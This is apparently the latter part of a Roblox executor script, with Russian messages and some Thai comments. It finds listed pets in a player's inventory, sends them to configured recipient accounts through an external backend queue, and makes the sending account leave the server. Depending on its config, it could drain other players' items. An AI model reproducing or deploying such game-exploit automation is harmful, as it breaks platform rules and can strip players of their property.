        local startTime = tick()
        local maxWaitTime = getgenv().Config.ServerSelectionTimeout
        
        while tick() - startTime < maxWaitTime do
            task.wait(2)
            
            if not LocalPlayer or not LocalPlayer.Character then
                AddMessage("Потеря соединения во время ожидания, завершение...", "error")
                CompleteTrade(availableReceiver.username, false)
                return
            end
            
            local targetPlayer = FindPlayerByName(availableReceiver.username)
            if targetPlayer then
                AddMessage("Получатель найден на сервере: " .. targetPlayer.Name, "success")
                break
            end
            
            AddMessage("Поиск получателя на сервере...", "info")
        end
        
        if not FindPlayerByName(availableReceiver.username) then
            AddMessage("Получатель не найден на сервере, завершение...", "error")
            CompleteTrade(availableReceiver.username, false)
            return
        end

        -- ถ้าหาเจอ ก็จะไปทำส่วนของการเทรดต่อไป...
    end    
    
    -- Получаем весь инвентарь
    local fullInventory = GetFullInventory()
    AddMessage("Найдено предметов в инвентаре: " .. #fullInventory, "info")
    
    -- Ищем питомцев для трейда
    local petsToTrade = {}
    local foundPets = {}
    local usedUUIDs = {} -- Для отслеживания уникальных питомцев
    
    for _, item in pairs(fullInventory) do
        if item:IsA("Tool") then
            local petUUID = item:GetAttribute("PET_UUID")
            if petUUID then
                local petData = GetPetData(item)
                if petData then
                    table.insert(foundPets, petData)
                    local baseName = GetBasePetName(petData.Name)
                    AddMessage("Найден питомец: " .. petData.Name .. " (основное имя: " .. baseName .. ")", "info")
                    
                    if IsPetInTradeList(petData.Name) then
                        -- Проверяем, что этот питомец еще не добавлен (по UUID)
                        if not usedUUIDs[petUUID] then
                            table.insert(petsToTrade, petData)
                            usedUUIDs[petUUID] = true
                            AddMessage("Питомец добавлен в список трейда: " .. baseName, "success")
                        else
                            AddMessage("Питомец уже в списке трейда (дубликат): " .. baseName, "warning")
                        end
                    else
                        AddMessage("Питомец НЕ в списке трейда: " .. baseName, "warning")
                    end
                end
            else
                AddMessage("Предмет не является питомцем: " .. item.Name, "info")
            end
        end
    end
    
    AddMessage("Всего найдено питомцев: " .. #foundPets, "info")
    
    if #petsToTrade == 0 then
        AddMessage("Нет питомцев для трейда в инвентаре", "warning")
        return
    end
    
    AddMessage("Найдено питомцев для трейда: " .. #petsToTrade, "info")
    
    -- Показываем всех найденных питомцев для отладки
    for i, petData in pairs(petsToTrade) do
        AddMessage("Питомец " .. i .. ": " .. petData.Name, "info")
    end
    
    local sentCount = 0
    local targetPlayer = nil
    
    -- Находим получателя на текущем сервере
    if availableReceiver then
        targetPlayer = FindPlayerByName(availableReceiver.username)
    else
        targetPlayer = FindFirstAvailableRecipient()
    end
    
    if not targetPlayer then
        AddMessage("Получатель не найден на сервере, завершение трейда", "error")
        if availableReceiver then
            CompleteTrade(availableReceiver.username, false)
        end
        return
    end
    
    -- Создаем копию массива для безопасного удаления элементов
    local petsToSend = {}
    for i, petData in pairs(petsToTrade) do
        petsToSend[i] = petData
    end
    
    local startTradeTime = tick()
    local maxTradeTime = getgenv().Config.TradeTimeout
    
    for i = #petsToSend, 1, -1 do
        -- Проверяем таймаут трейда
        if tick() - startTradeTime > maxTradeTime then
            AddMessage("Превышен таймаут трейда, завершение...", "warning")
            break
        end
        
        -- Проверяем подключение
        if not LocalPlayer or not LocalPlayer.Character then
            AddMessage("Потеря соединения во время трейда, завершение...", "error")
            break
        end
        
        -- Проверяем, что получатель все еще на сервере
        if not FindPlayerByName(targetPlayer.Name) then
            AddMessage("Получатель покинул сервер, завершение трейда...", "error")
            break
        end
        
        local petData = petsToSend[i]
        
        -- Проверяем, что питомец все еще существует
        if petData and petData.Tool and petData.Tool.Parent then
            -- Сначала берем питомца в руки
            if EquipPet(petData) then
                task.wait(1) -- Увеличиваем задержку для стабильности
                
                -- Затем отправляем
                if SendPet(petData, targetPlayer) then
                    sentCount = sentCount + 1
                    task.wait(2) -- Увеличиваем задержку между отправками
                    
                    -- Удаляем питомца из списка после успешной отправки
                    table.remove(petsToSend, i)
                else
                    AddMessage("Ошибка отправки питомца: " .. petData.Name, "error")
                    task.wait(1) -- Задержка при ошибке
                end
            else
                AddMessage("Ошибка взятия питомца в руки: " .. petData.Name, "error")
                task.wait(1) -- Задержка при ошибке
            end
        else
            -- Удаляем питомца из списка, если он больше не существует
            table.remove(petsToSend, i)
            AddMessage("Питомец больше не найден: " .. (petData and petData.Name or "неизвестный"), "warning")
        end
    end
    
    if sentCount > 0 then
        AddMessage("Отправлено питомцев: " .. sentCount, "success")
        
        -- Завершаем трейд в бекенде
        if availableReceiver then
            CompleteTrade(availableReceiver.username, true)
        end
        
        -- Проверяем, являемся ли мы отправителем
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        -- Если мы отправитель и успешно отправили питомцев, выходим с сервера
        if not isReceiver and getgenv().Config.LeaveServerAfterTrade then
            AddMessage("Отправитель: трейд завершен, выход с сервера через 3 секунды...", "info")
            AddMessage("Причина: Success traded!", "success")
            task.wait(3) -- Небольшая задержка перед выходом
            LeaveServerAfterTrade()
        elseif not isReceiver and not getgenv().Config.LeaveServerAfterTrade then
            AddMessage("Отправитель: трейд завершен, остаемся на сервере (настройка отключена)", "info")
        end
    else
        AddMessage("Не удалось отправить питомцев", "error")
        if availableReceiver then
            CompleteTrade(availableReceiver.username, false)
        end
    end
end

-- Обработчик входящих подарков
GiftPet.OnClientEvent:Connect(function(giftId, petName, senderName)
    AddMessage("Получен подарок от: " .. senderName .. " Питомец: " .. petName, "success")
    
    -- Автоматически принимаем все подарки
    AcceptGift(giftId)
end)

-- Обработчик отключения от сервера
game.Players.PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then
        AddMessage("Отключение от сервера обнаружено", "warning")
        HandleServerClosing()
    end
end)

-- Обработчик ошибок подключения
local connection = game:GetService("NetworkClient")
if connection then
    connection.ConnectionFailed:Connect(function(error)
        AddMessage("Ошибка подключения: " .. tostring(error), "error")
        HandleServerClosing()
    end)
end

-- Основной цикл
local function MainLoop()
    while getgenv().Config.Enabled do
        task.wait(5) -- Проверяем каждые 5 секунд
        
        local shouldContinue = false
        
        -- Проверяем стабильность соединения
        if not IsConnectionStable() then
            AddMessage("Нестабильное соединение, ожидание...", "warning")
            task.wait(10) -- Ждем дольше при проблемах с соединением
            shouldContinue = true
        end
        
        -- Периодически проверяем статус сервера
        if getgenv().Config.UseBackend and not shouldContinue then
            -- Проверяем доступность бекенда
            if not IsBackendAvailable() then
                AddMessage("Бекенд недоступен, работа в автономном режиме", "warning")
                shouldContinue = true
            else
                -- Проверяем, являемся ли мы получателем
                local isReceiver = false
                for _, username in pairs(getgenv().Config.Recipients) do
                    if username == LocalPlayer.Name then
                        isReceiver = true
                        break
                    end
                end
                
                    if isReceiver then
        -- Получатели переходят с VIP и полных серверов
        if IsVipServer() and getgenv().Config.AutoRejoinOnVipServer then
            AddMessage("Получатель: VIP сервер в основном цикле, переход...", "warning")
            -- Добавляем задержку перед переходом для стабильности
            task.wait(5)
            RejoinNormalServer()
            task.wait(15) -- Увеличиваем время ожидания после перехода
            shouldContinue = true
        elseif IsServerFull() then
            AddMessage("Получатель: сервер полный в основном цикле, переход...", "warning")
            task.wait(5)
            RejoinNormalServer()
            task.wait(15) -- Увеличиваем время ожидания после перехода
            shouldContinue = true
        end
    else
        -- Отправители остаются на своих серверах
        if IsVipServer() then
            AddMessage("Отправитель: VIP сервер, остаемся на текущем сервере", "info")
        elseif IsServerFull() then
            AddMessage("Отправитель: сервер полный, остаемся на текущем сервере", "info")
        end
    end
            end
        end
        
        if not shouldContinue and LocalPlayer.Character then
            AutoTrade()
        end
    end
end

-- Цикл для получателя (регистрация и обновление статуса)
local function ReceiverLoop()
    -- Регистрируемся как получатель при запуске
    if getgenv().Config.UseBackend then
        task.wait(2) -- Небольшая задержка для загрузки
        RegisterAsReceiver()
    end
    
    while getgenv().Config.Enabled do
        task.wait(30) -- Обновляем статус каждые 30 секунд
        
        local shouldContinue = false
        
        -- Проверяем статус сервера перед обновлением (только для получателей)
        if getgenv().Config.UseBackend then
            -- Проверяем, являемся ли мы получателем
            local isReceiver = false
            for _, username in pairs(getgenv().Config.Recipients) do
                if username == LocalPlayer.Name then
                    isReceiver = true
                    break
                end
            end
            
            if isReceiver then
                -- Только получатели проверяют и переходят
                if IsVipServer() and getgenv().Config.AutoRejoinOnVipServer then
                    AddMessage("Получатель: VIP сервер в цикле получателя, переход...", "warning")
                    RejoinNormalServer()
                    task.wait(10) -- Ждем дольше после перехода
                    shouldContinue = true
                elseif IsServerFull() then
                    AddMessage("Получатель: сервер полный в цикле получателя, переход...", "warning")
                    RejoinNormalServer()
                    task.wait(10) -- Ждем дольше после перехода
                    shouldContinue = true
                end
            end
        end
        
        if not shouldContinue and getgenv().Config.UseBackend then
            UpdateReceiverStatus()
        end
    end
end

-- Запуск основного цикла
task.spawn(MainLoop)

-- Запуск цикла для получателя
task.spawn(ReceiverLoop)

-- Команды для управления
local function CreateCommands()
    local function ToggleAutoTrade()
        getgenv().Config.Enabled = not getgenv().Config.Enabled
        AddMessage("Авто трейд: " .. (getgenv().Config.Enabled and "Включен" or "Выключен"), "info")
    end
    
    local function SetTargetPlayer(username)
        -- Очищаем список получателей и добавляем одного игрока
        getgenv().Config.Recipients = {username}
        AddMessage("Целевой игрок установлен: " .. username, "info")
    end
    
    local function AddRecipient(username)
        -- Проверяем, нет ли уже такого игрока в списке
        for _, existingPlayer in pairs(getgenv().Config.Recipients) do
            if existingPlayer == username then
                AddMessage("Игрок " .. username .. " уже в списке получателей", "warning")
                return
            end
        end
        
        table.insert(getgenv().Config.Recipients, username)
        AddMessage("Получатель добавлен: " .. username, "success")
    end
    
    local function RemoveRecipient(username)
        for i, player in pairs(getgenv().Config.Recipients) do
            if player == username then
                table.remove(getgenv().Config.Recipients, i)
                AddMessage("Получатель удален: " .. username, "warning")
                break
            end
        end
    end
    
    local function ShowRecipients()
        AddMessage("=== Список получателей ===", "info")
        for i, player in pairs(getgenv().Config.Recipients) do
            AddMessage(i .. ". " .. player, "info")
        end
        AddMessage("=========================", "info")
    end
    
    local function AddPetToTradeList(petName)
        table.insert(getgenv().Config.PetsToTrade, petName)
        AddMessage("Питомец добавлен в список трейда: " .. petName, "success")
    end
    
    local function RemovePetFromTradeList(petName)
        for i, pet in pairs(getgenv().Config.PetsToTrade) do
            if pet == petName then
                table.remove(getgenv().Config.PetsToTrade, i)
                AddMessage("Питомец удален из списка трейда: " .. petName, "warning")
                break
            end
        end
    end
    
    local function ShowConfig()
        AddMessage("=== Конфигурация авто трейда ===", "info")
        AddMessage("Статус: " .. (getgenv().Config.Enabled and "Включен" or "Выключен"), "info")
        AddMessage("Бекенд: " .. (getgenv().Config.UseBackend and "Включен" or "Выключен"), "info")
        AddMessage("Автотелепорт: " .. (getgenv().Config.AutoTeleport and "Включен" or "Выключен"), "info")
        AddMessage("Пропуск телепорта без питомцев: " .. (getgenv().Config.SkipTeleportIfNoPets and "Включен" or "Выключен"), "info")
        AddMessage("Выход с сервера после трейда: " .. (getgenv().Config.LeaveServerAfterTrade and "Включен" or "Выключен"), "info")
        AddMessage("URL бекенда: " .. getgenv().Config.BackendURL, "info")
        AddMessage("Получатели:", "info")
        for i, player in pairs(getgenv().Config.Recipients) do
            AddMessage(i .. ". " .. player, "info")
        end
        AddMessage("Питомцы для трейда:", "info")
        for i, pet in pairs(getgenv().Config.PetsToTrade) do
            AddMessage(i .. ". " .. pet, "info")
        end
        AddMessage("================================", "info")
    end
    
    local function ToggleBackend()
        getgenv().Config.UseBackend = not getgenv().Config.UseBackend
        AddMessage("Бекенд: " .. (getgenv().Config.UseBackend and "Включен" or "Выключен"), "info")
    end
    
    local function DisableBackendOnError()
        if getgenv().Config.UseBackend then
            AddMessage("Отключение бекенда из-за ошибок подключения", "warning")
            getgenv().Config.UseBackend = false
            AddMessage("Бекенд отключен, работа в автономном режиме", "info")
        end
    end
    
    local function ForceRejoinOnServerClose()
        AddMessage("Принудительный переход на новый сервер...", "info")
        HandleServerClosing()
    end
    
    local function ToggleAutoTeleport()
        getgenv().Config.AutoTeleport = not getgenv().Config.AutoTeleport
        AddMessage("Автотелепорт: " .. (getgenv().Config.AutoTeleport and "Включен" or "Выключен"), "info")
    end
    
    local function CheckBackendStatus()
        if not getgenv().Config.UseBackend then
            AddMessage("Бекенд отключен", "warning")
            return
        end
        
        local url = getgenv().Config.BackendURL .. "/api/stats"
        local response = MakeHttpRequest(url, "GET")
        
        if response and response.success and response.stats then -- เพิ่มการตรวจสอบ response.stats
            AddMessage("=== Статус бекенда ===", "info")
            AddMessage("Активных jobs: " .. tostring(response.stats.activeJobs), "info")
            AddMessage("Активных получателей: " .. tostring(response.stats.activeReceivers), "info")
            AddMessage("Время сервера: " .. tostring(response.stats.serverTime), "info")
            AddMessage("=======================", "info")
        else
            AddMessage("Ошибка подключения к бекенду", "error")
        end

        if response and response.success and response.stats and response.stats.serverTime then
            AddMessage("Время сервера: " .. response.stats.serverTime, "info")
        else
            AddMessage("Не удалось получить время сервера", "warning")
        end
    end
    
    local function RegisterReceiver()
        RegisterAsReceiver()
    end
    
    local function UnregisterReceiver()
        UnregisterAsReceiver()
    end
    
    local function UpdateReceiver()
        UpdateReceiverStatus()
    end
    
    local function CheckRole()
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if isReceiver then
            AddMessage("Текущая роль: Получатель (ожидаем отправителя)", "success")
        else
            AddMessage("Текущая роль: Отправитель (ищем получателя)", "info")
        end
    end
    
    local function CheckServerStatus()
        AddMessage("=== Статус сервера ===", "info")
        AddMessage("Job ID: " .. game.JobId, "info")
        AddMessage("Place ID: " .. game.PlaceId, "info")
        AddMessage("VIP сервер: " .. (IsVipServer() and "Да" or "Нет"), "info")
        AddMessage("Сервер полный: " .. (IsServerFull() and "Да" or "Нет"), "info")
        AddMessage("Игроков: " .. #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers, "info")
        
        -- Дополнительная информация о сервере
        if IsVipServer() then
            AddMessage("⚠️ ВНИМАНИЕ: VIP сервер обнаружен!", "warning")
            AddMessage("Рекомендуется переход на обычный сервер", "warning")
        end
        
        if IsServerFull() then
            AddMessage("⚠️ ВНИМАНИЕ: Сервер полный!", "warning")
            AddMessage("Рекомендуется переход на другой сервер", "warning")
        end
        
        AddMessage("=====================", "info")
    end
    
    local function ForceRejoinNormal()
        -- Проверяем, являемся ли мы получателем
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if isReceiver then
            AddMessage("Принудительный переход на обычный сервер (получатель)...", "info")
            RejoinNormalServer()
        else
            AddMessage("Отправители не переходят на обычные серверы", "warning")
        end
    end
    
    local function CheckInventoryPets()
        AddMessage("=== Проверка питомцев в инвентаре ===", "info")
        
        local petsInInventory = GetPetsInInventory()
        AddMessage("Всего питомцев в инвентаре: " .. #petsInInventory, "info")
        
        if #petsInInventory == 0 then
            AddMessage("❌ Нет питомцев в инвентаре!", "error")
            return
        end
        
        local tradePetsCount = 0
        local tradePetsList = {}
        
        for i, petData in pairs(petsInInventory) do
            local baseName = GetBasePetName(petData.Name)
            local isInTradeList = IsPetInTradeList(petData.Name)
            
            AddMessage(i .. ". " .. petData.Name .. " (основное имя: " .. baseName .. ")", "info")
            
            if isInTradeList then
                AddMessage("   ✅ В списке трейда", "success")
                tradePetsCount = tradePetsCount + 1
                table.insert(tradePetsList, petData.Name)
            else
                AddMessage("   ❌ НЕ в списке трейда", "warning")
            end
        end
        
        AddMessage("=== Результат ===", "info")
        AddMessage("Питомцев для трейда: " .. tradePetsCount .. "/" .. #petsInInventory, "info")
        
        if tradePetsCount > 0 then
            AddMessage("✅ Готов к трейду!", "success")
            AddMessage("Питомцы для трейда:", "info")
            for i, petName in pairs(tradePetsList) do
                AddMessage("  " .. i .. ". " .. petName, "info")
            end
        else
            AddMessage("❌ Нет питомцев для трейда!", "error")
            AddMessage("Добавьте питомцев в список трейда или получите нужных питомцев", "warning")
        end
        
        AddMessage("=======================", "info")
    end
    
    local function CheckTradeQueue()
        if not getgenv().Config.UseBackend then
            AddMessage("Бекенд отключен, очередь недоступна", "warning")
            return
        end
        
        local url = getgenv().Config.BackendURL .. "/api/trade-queue"
        local response = MakeHttpRequest(url, "GET")
        
        if response and response.success then
            AddMessage("=== Очередь трейдов ===", "info")
            AddMessage("Всего в очереди: " .. response.total, "info")
            
            if response.total > 0 then
                for i, trade in pairs(response.queue) do
                    AddMessage(i .. ". " .. trade.sender .. " -> " .. trade.receiver, "info")
                    AddMessage("   Сервер: " .. trade.serverId, "info")
                    AddMessage("   Время: " .. os.date("%H:%M:%S", trade.timestamp / 1000), "info")
                end
            else
                AddMessage("Очередь пуста", "info")
            end
            
            AddMessage("=====================", "info")
        else
            AddMessage("Ошибка получения очереди трейдов", "error")
        end
    end
    
    local function CheckReceiversStatus()
        if not getgenv().Config.UseBackend then
            AddMessage("Бекенд отключен, статус недоступен", "warning")
            return
        end
        
        local url = getgenv().Config.BackendURL .. "/api/receivers"
        local response = MakeHttpRequest(url, "GET")
        
        if response and response.success then
            AddMessage("=== Статус получателей ===", "info")
            
            local waitingCount = 0
            local completedCount = 0
            
            for i, receiver in pairs(response.receivers) do
                local status = receiver.status == "waiting" and "✅ Ожидает" or "✅ Завершен"
                AddMessage(i .. ". " .. receiver.username .. " - " .. status, "info")
                AddMessage("   Питомцев: " .. receiver.petsCount .. "/" .. receiver.maxPets, "info")
                AddMessage("   Сервер: " .. receiver.serverId, "info")
                
                if receiver.status == "waiting" then
                    waitingCount = waitingCount + 1
                else
                    completedCount = completedCount + 1
                end
            end
            
            AddMessage("=== Итого ===", "info")
            AddMessage("Ожидающих: " .. waitingCount, "info")
            AddMessage("Завершенных: " .. completedCount, "info")
            AddMessage("=======================", "info")
        else
            AddMessage("Ошибка получения статуса получателей", "error")
        end
    end
    
    local function RequestTradeServerCommand(targetReceiver)
        if not targetReceiver then
            AddMessage("Укажите имя получателя", "error")
            return
        end
        
        if not getgenv().Config.UseBackend then
            AddMessage("Бекенд отключен", "warning")
            return
        end
        
        AddMessage("Присоединение к обычному серверу для трейда с " .. targetReceiver .. "...", "info")
        
        if JoinNormalServer() then
            AddMessage("Присоединение к серверу запущено!", "success")
            AddMessage("Ожидание загрузки сервера...", "info")
        else
            AddMessage("Ошибка присоединения к серверу", "error")
        end
    end
    
    local function SetMaxPetsPerAccount(maxPets)
        if not maxPets or type(maxPets) ~= "number" then
            AddMessage("Укажите число питомцев (например: SetMaxPetsPerAccount(55))", "error")
            return
        end
        
        getgenv().Config.MaxPetsPerAccount = maxPets
        AddMessage("Максимальное количество питомцев на аккаунт установлено: " .. maxPets, "success")
    end
    
    local function SetTradeTimeout(timeout)
        if not timeout or type(timeout) ~= "number" then
            AddMessage("Укажите таймаут в секундах (например: SetTradeTimeout(300))", "error")
            return
        end
        
        getgenv().Config.TradeTimeout = timeout
        AddMessage("Таймаут трейда установлен: " .. timeout .. " секунд", "success")
    end
    
    local function ToggleAutoRejoinOnVipServer()
        getgenv().Config.AutoRejoinOnVipServer = not getgenv().Config.AutoRejoinOnVipServer
        AddMessage("Авто переход с VIP серверов: " .. (getgenv().Config.AutoRejoinOnVipServer and "Включен" or "Выключен"), "info")
    end
    
    local function CheckConnectionStatus()
        AddMessage("=== Статус соединения ===", "info")
        AddMessage("LocalPlayer: " .. (LocalPlayer and "✅" or "❌"), "info")
        AddMessage("Character: " .. (LocalPlayer and LocalPlayer.Character and "✅" or "❌"), "info")
        
        local connection = game:GetService("NetworkClient")
        AddMessage("NetworkClient: " .. (connection and "✅" or "❌"), "info")
        AddMessage("Connection: " .. (connection and connection.Connection and "✅" or "❌"), "info")
        
        local teleportState = TeleportService:GetLocalPlayerTeleportData()
        AddMessage("Teleporting: " .. (teleportState and teleportState.teleporting and "✅" or "❌"), "info")
        
        AddMessage("Стабильность соединения: " .. (IsConnectionStable() and "✅ Стабильно" or "❌ Нестабильно"), "info")
        AddMessage("=======================", "info")
    end
    
    local function WaitForConnection(timeout)
        timeout = timeout or 30
        AddMessage("Ожидание стабильного соединения...", "info")
        
        if WaitForStableConnection(timeout) then
            AddMessage("Соединение стабилизировано!", "success")
            return true
        else
            AddMessage("Не удалось стабилизировать соединение за " .. timeout .. " секунд", "error")
            return false
        end
    end
    
    local function CheckBackendAvailability()
        if not getgenv().Config.UseBackend then
            AddMessage("Бекенд отключен в конфигурации", "warning")
            return false
        end
        
        AddMessage("Проверка доступности бекенда...", "info")
        
        if IsBackendAvailable() then
            AddMessage("✅ Бекенд доступен!", "success")
            return true
        else
            AddMessage("❌ Бекенд недоступен", "error")
            return false
        end
    end
    
    local function WaitForBackendCommand(timeout)
        timeout = timeout or 60
        return WaitForBackend(timeout)
    end
    
    local function ToggleSkipTeleportIfNoPets()
        getgenv().Config.SkipTeleportIfNoPets = not getgenv().Config.SkipTeleportIfNoPets
        AddMessage("Пропуск телепорта без питомцев: " .. (getgenv().Config.SkipTeleportIfNoPets and "Включен" or "Выключен"), "info")
    end
    
    local function ToggleLeaveServerAfterTrade()
        getgenv().Config.LeaveServerAfterTrade = not getgenv().Config.LeaveServerAfterTrade
        AddMessage("Выход с сервера после трейда: " .. (getgenv().Config.LeaveServerAfterTrade and "Включен" or "Выключен"), "info")
    end
    
    local function ForceLeaveServer()
        -- Проверяем, являемся ли мы отправителем
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if not isReceiver then
            AddMessage("Принудительный выход с сервера (отправитель)...", "info")
            LeaveServerAfterTrade()
        else
            AddMessage("Получатели не выходят с сервера принудительно", "warning")
        end
    end
    
    -- Глобальные команды
    _G.ToggleAutoTrade = ToggleAutoTrade
    _G.SetTargetPlayer = SetTargetPlayer
    _G.AddRecipient = AddRecipient
    _G.RemoveRecipient = RemoveRecipient
    _G.ShowRecipients = ShowRecipients
    _G.AddPetToTradeList = AddPetToTradeList
    _G.RemovePetFromTradeList = RemovePetFromTradeList
    _G.ShowConfig = ShowConfig
    _G.ToggleBackend = ToggleBackend
    _G.ToggleAutoTeleport = ToggleAutoTeleport
    _G.CheckBackendStatus = CheckBackendStatus
    _G.RegisterReceiver = RegisterReceiver
    _G.UnregisterReceiver = UnregisterReceiver
    _G.UpdateReceiver = UpdateReceiver
    _G.CheckRole = CheckRole
    _G.CheckServerStatus = CheckServerStatus
    _G.ForceRejoinNormal = ForceRejoinNormal
    _G.CheckInventoryPets = CheckInventoryPets
    _G.ToggleSkipTeleportIfNoPets = ToggleSkipTeleportIfNoPets
    _G.ToggleLeaveServerAfterTrade = ToggleLeaveServerAfterTrade
    _G.ForceLeaveServer = ForceLeaveServer
    _G.CheckTradeQueue = CheckTradeQueue
    _G.CheckReceiversStatus = CheckReceiversStatus
    _G.RequestTradeServerCommand = RequestTradeServerCommand
    _G.SetMaxPetsPerAccount = SetMaxPetsPerAccount
    _G.SetTradeTimeout = SetTradeTimeout
    _G.ToggleAutoRejoinOnVipServer = ToggleAutoRejoinOnVipServer
    _G.CheckConnectionStatus = CheckConnectionStatus
    _G.WaitForConnection = WaitForConnection
    _G.CheckBackendAvailability = CheckBackendAvailability
    _G.WaitForBackendCommand = WaitForBackendCommand
    _G.DisableBackendOnError = DisableBackendOnError
    _G.ForceRejoinOnServerClose = ForceRejoinOnServerClose
    
    AddMessage("=== Авто трейд скрипт загружен ===", "success")
    
    -- Проверяем роль текущего игрока
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    if isReceiver then
        AddMessage("РОЛЬ: Получатель (ожидаем отправителя)", "success")
    else
        AddMessage("РОЛЬ: Отправитель (ищем получателя)", "info")
    end
    
    AddMessage("Команды:", "info")
    AddMessage("ToggleAutoTrade() - включить/выключить авто трейд", "info")
    AddMessage("SetTargetPlayer('username') - установить одного целевого игрока", "info")
    AddMessage("AddRecipient('username') - добавить получателя в список", "info")
    AddMessage("RemoveRecipient('username') - удалить получателя из списка", "info")
    AddMessage("ShowRecipients() - показать список получателей", "info")
    AddMessage("AddPetToTradeList('PetName') - добавить питомца в список", "info")
    AddMessage("RemovePetFromTradeList('PetName') - удалить питомца из списка", "info")
    AddMessage("ShowConfig() - показать текущую конфигурацию", "info")
    AddMessage("ToggleBackend() - включить/выключить бекенд", "info")
    AddMessage("ToggleAutoTeleport() - включить/выключить автотелепорт", "info")
    AddMessage("CheckBackendStatus() - проверить статус бекенда", "info")
    AddMessage("RegisterReceiver() - зарегистрироваться как получатель", "info")
    AddMessage("UnregisterReceiver() - удалить регистрацию получателя", "info")
    AddMessage("UpdateReceiver() - обновить статус получателя", "info")
    AddMessage("CheckRole() - проверить текущую роль", "info")
    AddMessage("CheckServerStatus() - проверить статус сервера", "info")
    AddMessage("ForceRejoinNormal() - принудительно перейти на обычный сервер (только получатели)", "info")
    AddMessage("CheckInventoryPets() - проверить питомцев в инвентаре", "info")
    AddMessage("ToggleSkipTeleportIfNoPets() - включить/выключить пропуск телепорта без питомцев", "info")
    AddMessage("ToggleLeaveServerAfterTrade() - включить/выключить выход с сервера после трейда", "info")
    AddMessage("ForceLeaveServer() - принудительно выйти с сервера (только отправители)", "info")
    AddMessage("CheckTradeQueue() - проверить очередь трейдов", "info")
    AddMessage("CheckReceiversStatus() - проверить статус получателей", "info")
    AddMessage("RequestTradeServerCommand('username') - присоединиться к серверу для трейда", "info")
    AddMessage("SetMaxPetsPerAccount(number) - установить макс. питомцев на аккаунт", "info")
    AddMessage("SetTradeTimeout(seconds) - установить таймаут трейда", "info")
    AddMessage("ToggleAutoRejoinOnVipServer() - включить/выключить авто переход с VIP серверов", "info")
    AddMessage("CheckConnectionStatus() - проверить статус соединения", "info")
    AddMessage("WaitForConnection(timeout) - ожидать стабильного соединения", "info")
    AddMessage("CheckBackendAvailability() - проверить доступность бекенда", "info")
    AddMessage("WaitForBackendCommand(timeout) - ожидать доступности бекенда", "info")
    AddMessage("DisableBackendOnError() - отключить бекенд при ошибках", "info")
    AddMessage("ForceRejoinOnServerClose() - принудительно перейти на новый сервер", "info")
    AddMessage("=====================================", "info")
    AddMessage("Текущий список получателей:", "info")
    for i, player in pairs(getgenv().Config.Recipients) do
        AddMessage(i .. ". " .. player, "info")
    end
    AddMessage("Текущий список питомцев для трейда:", "info")
    for i, pet in pairs(getgenv().Config.PetsToTrade) do
        AddMessage(i .. ". " .. pet, "info")
    end
    
    -- Проверяем статус бекенда при запуске
    if getgenv().Config.UseBackend then
        task.wait(2) -- Небольшая задержка для стабилизации
        if not CheckBackendAvailability() then
            AddMessage("⚠️ Бекенд недоступен при запуске!", "warning")
            AddMessage("Используйте DisableBackendOnError() для отключения", "info")
        else
            CheckBackendStatus()
        end
    end
    
    -- Проверяем статус сервера при запуске
    task.wait(1) -- Небольшая задержка для загрузки
    CheckServerStatus()
    
    -- Проверяем роль и статус сервера при запуске
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    if isReceiver then
        -- Получатели переходят с VIP серверов
        if IsVipServer() and getgenv().Config.AutoRejoinOnVipServer then
            AddMessage("Получатель: автоматический переход с VIP сервера на обычный...", "warning")
            RejoinNormalServer()
        elseif IsVipServer() and not getgenv().Config.AutoRejoinOnVipServer then
            AddMessage("Получатель: VIP сервер, авто переход отключен", "info")
        end
    else
        -- Отправители остаются на своих серверах
        if IsVipServer() then
            AddMessage("Отправитель: VIP сервер, остаемся на текущем сервере", "info")
        end
    end
    
    -- Проверяем питомцев в инвентаре при запуске
    task.wait(2) -- Ждем загрузки персонажа
    CheckInventoryPets()
end

CreateCommands() 